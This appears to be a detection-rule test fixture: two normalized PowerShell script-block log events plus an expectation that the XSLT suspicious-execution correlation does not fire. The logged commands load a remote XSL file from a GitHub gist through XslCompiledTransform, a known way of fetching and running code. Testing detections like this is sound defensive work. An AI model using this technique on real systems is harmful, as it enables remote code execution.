{"action": "execute", "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2023-07-05T04:03:14.480607100Z\"},\"EventRecordID\":\"1252877\",\"Correlation\":{\"ActivityID\":\"{fc27780d-9e5b-0001-87cd-17fe5b9ed901}\"},\"Execution\":{\"ProcessID\":\"2040\",\"ThreadID\":\"5388\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"pc.domain.com\",\"Security\":{\"UserID\":\"S-1-5-21-936165926-1453112849-1990505774-500\"}},\"EventData\":{\"Data\":[{\"text\":\"1\",\"Name\":\"MessageNumber\"},{\"text\":\"1\",\"Name\":\"MessageTotal\"},{\"text\":\"$x=New-Object System.Xml.Xsl.XslCompiledTransform\",\"Name\":\"ScriptBlockText\"},{\"text\":\"2967cd2b-209c-4a8e-805d-e5739a0cbfdc\",\"Name\":\"ScriptBlockId\"},{\"Name\":\"Path\"}]}}}", "category.generic": "Command", "category.high": "System Management", "category.low": "Manipulation", "datafield5": "$x=New-Object System.Xml.Xsl.XslCompiledTransform", "event_src.category": "Operating system", "event_src.fqdn": "pc.domain.com", "event_src.host": "pc.domain.com", "event_src.hostname": "pc", "event_src.subsys": "Microsoft-Windows-PowerShell/Operational", "event_src.title": "windows", "event_src.vendor": "microsoft", "generator.type": "logcollector", "generator.version": "N26.0.2936", "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed", "importance": "info", "input_id": "00000000-0000-0000-0000-000000000000", "mime": "application/x-pt-eventlog", "msgid": "4104", "normalized": true, "numfield1": 1, "numfield2": 1, "object": "command", "object.account.id": "S-1-5-21-936165926-1453112849-1990505774-500", "object.id": "2967cd2b-209c-4a8e-805d-e5739a0cbfdc", "object.process.cmdline": "$x=New-Object System.Xml.Xsl.XslCompiled_Transform", "object.process.id": "2040", "object.value": "$x=New-Object System.Xml.Xsl.XslCompiledTransform", "recv_ipv4": "127.0.0.1", "recv_time": "2023-07-07T00:57:29.601Z", "status": "success", "subject": "account", "subject.account.id": "S-1-5-21-936165926-1453112849-1990505774-500", "subject.id": "S-1-5-21-936165926-1453112849-1990505774-500", "tag": "some_tag", "task_id": "00000000-0000-0000-0000-000000000000", "taxonomy_version": "26.0.215-release-26.0", "time": "2023-07-05T04:03:14.480Z", "type": "raw", "uuid": "eb589af4-3191-4d01-8a90-926faa091bd8"}
{"action": "execute", "body": "{\"Event\":{\"xmlns\":\"http://schemas.microsoft.com/win/2004/08/events/event\",\"System\":{\"Provider\":{\"Name\":\"Microsoft-Windows-PowerShell\",\"Guid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\"},\"EventID\":\"4104\",\"Version\":\"1\",\"Level\":\"5\",\"Task\":\"2\",\"Opcode\":\"15\",\"Keywords\":\"0x0\",\"TimeCreated\":{\"SystemTime\":\"2023-07-05T04:03:34.010560800Z\"},\"EventRecordID\":\"1252882\",\"Correlation\":{\"ActivityID\":\"{fc27780d-9e5b-0001-63cf-17fe5b9ed901}\"},\"Execution\":{\"ProcessID\":\"2040\",\"ThreadID\":\"5388\"},\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"pc.domain.com\",\"Security\":{\"UserID\":\"S-1-5-21-936165926-1453112849-1990505774-500\"}},\"EventData\":{\"Data\":[{\"text\":\"1\",\"Name\":\"MessageNumber\"},{\"text\":\"1\",\"Name\":\"MessageTotal\"},{\"text\":\"$x.Load('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xsl',$s,$r)\",\"Name\":\"ScriptBlockText\"},{\"text\":\"c08e39e8-5d97-4f88-b7fd-77bd743327d8\",\"Name\":\"ScriptBlockId\"},{\"Name\":\"Path\"}]}}}", "category.generic": "Command", "category.high": "System Management", "category.low": "Manipulation", "datafield5": "$x.Load('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xsl',$s,$r)", "event_src.category": "Operating system", "event_src.fqdn": "pc.domain.com", "event_src.host": "pc.domain.com", "event_src.hostname": "pc", "event_src.subsys": "Microsoft-Windows-PowerShell/Operational", "event_src.title": "windows", "event_src.vendor": "microsoft", "generator.type": "logcollector", "generator.version": "N26.0.2936", "id": "PT_Microsoft_Windows_eventlog_Common_PowerShell_4104_Command_executed", "importance": "info", "input_id": "00000000-0000-0000-0000-000000000000", "mime": "application/x-pt-eventlog", "msgid": "4104", "normalized": true, "numfield1": 1, "numfield2": 1, "object": "command", "object.account.id": "S-1-5-21-936165926-1453112849-1990505774-500", "object.id": "c08e39e8-5d97-4f88-b7fd-77bd743327d8", "object.process.cmdline": "$x.Load('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xsl',$s,$r)", "object.process.id": "2040", "object.value": "$x.Load('https://gist.githubusercontent.com/bohops/ee9e2d7bdd606c264a0c6599b0146599/raw/f8245f99992eff00eb5f0d5738dfbf0937daf5e4/xsl-notepad.xsl',$s,$r)", "recv_ipv4": "127.0.0.1", "recv_time": "2023-07-07T00:57:29.602Z", "status": "success", "subject": "account", "subject.account.id": "S-1-5-21-936165926-1453112849-1990505774-500", "subject.id": "S-1-5-21-936165926-1453112849-1990505774-500", "tag": "some_tag", "task_id": "00000000-0000-0000-0000-000000000000", "taxonomy_version": "26.0.215-release-26.0", "time": "2023-07-05T04:03:34.010Z", "type": "raw", "uuid": "775f1f2c-b004-47e2-8973-a2e9bd700723"}

expect not {"correlation_name": "XSLT_XML_Suspicious_Powershell_Execution"}
